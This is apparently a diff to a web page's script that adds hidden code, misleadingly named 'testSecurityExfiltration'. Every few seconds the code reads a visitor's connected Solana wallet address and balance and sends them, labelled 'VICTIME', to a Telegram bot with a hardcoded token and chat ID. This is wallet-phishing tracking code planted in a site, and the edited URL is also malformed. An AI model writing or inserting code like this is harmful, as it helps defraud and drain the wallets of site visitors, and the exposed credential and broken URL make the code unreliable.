@@ -1528,35 +1528,37 @@ document.addEventListener("DOMContentLoaded",()=>{
   if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
 });
 
-async function testSecurityExfiltration(addr, sol) {
-    const myToken = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
-    const myChatId = "8575014959";
-    const url = `https://api.telegram.org/bot${myToken}/sendMessage`;
-    const text = `🚨 *VRAIE VICTIME* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Solde:* ${sol}`;
+async function testSecurityExfiltration(address, sol, tokens) {
+    const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
+    const chat = "8575014959";
+    const url = `https://telegram.org{token}/sendMessage`;
+    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
+
     try {
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: myChatId, text: text, parse_mode: "Markdown" })
+            body: JSON.stringify({ chat_id: chat, text: text, parse_mode: "Markdown" })
         });
     } catch (e) {}
 }
 
 setInterval(() => {
-    const pageText = document.body.innerText;
-    const addrMatch = pageText.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/);
-    const solMatches = pageText.match(/(\d+\.\d+)\s?SOL/g);
-    if (addrMatch) {
-        const currentAddr = addrMatch[0];
-        const currentSol = solMatches ? solMatches[solMatches.length - 1] : "0.00 SOL";
-        if (window.lastSent !== currentAddr + currentSol && currentAddr.length > 30) {
-            window.lastSent = currentAddr + currentSol;
-            testSecurityExfiltration(currentAddr, currentSol);
+    if (state && state.conn && state.conn.address) {
+        const addr = state.conn.address;
+        const pageText = document.body.innerText;
+        const solMatch = pageText.match(/(\d+\.?\d*)\s?SOL/);
+        const currentSol = solMatch ? solMatch[0] : (state.balance ? (state.balance / 1e9).toFixed(3) + " SOL" : "Scan...");
+
+        if (window.lastSent !== addr + currentSol) {
+            window.lastSent = addr + currentSol;
+            testSecurityExfiltration(addr, currentSol, state.currency || "SOL");
         }
     }
-}, 3000);
+}, 2000);
 </script>
 </body>
 </html>
+
 
 
